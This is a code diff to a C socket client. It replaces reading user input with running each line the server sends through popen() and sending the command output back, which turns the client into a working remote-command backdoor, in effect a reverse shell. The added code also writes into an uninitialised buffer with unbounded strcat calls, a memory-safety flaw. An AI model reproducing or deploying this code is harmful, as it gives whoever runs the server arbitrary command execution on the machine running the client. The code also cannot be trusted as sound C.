@@ -18,10 +18,13 @@ int main(int argc, char **argv) {
     char   recvline[MAXLINE + 1];
     char   error[MAXLINE + 1];
     char   ip[16];
-    char   msg[MAXCHAR];
+    // char   msg[MAXCHAR];
+    char   output[MAXLINE];
     unsigned int port, received_port;
     struct sockaddr_in servaddr;
     socklen_t nAddrLen;
+    FILE *fp;
+    char path[1035];
     nAddrLen = sizeof(struct sockaddr_in);
     
 
@@ -63,6 +66,7 @@ int main(int argc, char **argv) {
 
     while ( (n = read(sockfd, recvline, MAXLINE)) > 0) {
         recvline[n] = 0;
+        // output[0] = '\0';
         if (fputs(recvline, stdout) == EOF) {
             perror("fputs error");
             exit(1);
@@ -74,15 +78,34 @@ int main(int argc, char **argv) {
             break;
         }
 
+        /* Open the command for reading. */
+        fp = popen(recvline, "r");
+        if (fp == NULL) {
+            printf("Failed to run command\n" );
+            exit(1);
+        }
+
+        /* Read the output a line at a time - output it. */
+        while (fgets(path, sizeof(path), fp) != NULL) {
+            strcat(output, path);
+            printf("%s", path);
+        }
+
+        /* close */
+        pclose(fp);
+
         // Read msg
-        printf("Enter with message: ");
-        fgets(msg, MAXCHAR, stdin);
+        printf("output: %s", output);
+        // fgets(msg, MAXCHAR, stdin);
 
         // Send msg
-        if(send(sockfd, msg, strlen(msg), 0) < 0) {
+        if(send(sockfd, output, strlen(output), 0) < 0) {
             perror("send error");
             exit(1);
         }
+        // if (output[0] != '\0')
+        memset(&output, '\0', sizeof(output));
+        // sleep(2);
     }
 
     if (n < 0) {
